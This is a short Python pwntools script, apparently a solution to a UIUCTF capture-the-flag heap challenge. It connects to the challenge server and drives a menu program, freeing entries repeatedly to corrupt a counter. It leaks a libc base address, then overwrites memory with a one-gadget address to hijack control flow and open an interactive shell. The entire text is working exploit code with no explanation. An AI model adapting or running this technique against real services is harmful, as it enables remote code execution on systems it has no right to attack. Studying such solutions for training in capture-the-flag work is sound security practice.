# by hgarrereyn

from pwn import *
import binascii

s = remote('challenges1.uiuc.tf', 38910)

s.recvuntil('Choice: ')

def order():
    s.sendline('0')
    s.recvuntil('Choice:')

def count():
    s.sendline('1')
    s.recvuntil('Choice:')

def make(name, age):
    s.sendline('2')
    s.recvuntil('? ')
    s.sendline(name)
    s.recvuntil('? ')
    s.sendline(str(age))
    s.recvuntil('Choice: ')

def delete():
    s.sendline('3')
    return s.recvuntil('Choice: ')

def parse_addr(r):
    leak = r.split('\n')[1].split(' ')[0][:-1]
    addr = int(binascii.hexlify(leak[::-1]), 16)
    return addr

# setup
make('a',1)
make('b',1)
delete()
delete()
delete()
order()

# the age of the next make will overwrite the count variable

# leak libc
make('f',26)
delete()

libc_base = parse_addr(delete()) - 4131819 # specific to the provided libc
log.info('Libc base: ' + hex(libc_base))

# reset the pointer
count()
make('a',1)
make('b',1)
delete()
delete()
delete()

# next age will overwrite count variable again
make('a', -9223372036854775792)

# magic gadget
make(p64(libc_base + 0xfccde), 1)

# return, jump to magic gadget
s.sendline('9')

s.interactive()
